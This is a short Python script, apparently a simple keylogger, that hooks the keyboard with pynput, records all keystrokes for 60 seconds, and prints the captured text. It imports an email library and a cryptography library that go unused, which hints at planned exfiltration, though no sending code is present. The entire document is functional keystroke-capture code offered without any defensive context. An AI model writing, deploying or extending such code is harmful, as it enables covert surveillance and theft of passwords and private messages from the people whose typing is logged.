from pynput import keyboard
import cryptography
import yagmail
import time

pressed_key= []

def typing(key):
    global pressed_key
    if type(key) == keyboard.Key:
        if key == keyboard.Key.space:
            pressed_key.append(" ")
        elif key == keyboard.Key.enter:
            pressed_key.append("\n")
        elif key == keyboard.Key.backspace and pressed_key:
            del pressed_key[-1]
        elif key == keyboard.Key.tab:
            pressed_key.append("    ")
    else:
        pressed_key.append(str(key))

key_listener= keyboard.Listener(on_press=typing)
key_listener.start()
time.sleep(60)
key_listener.stop()


text= ''.join(pressed_key)
print (text)
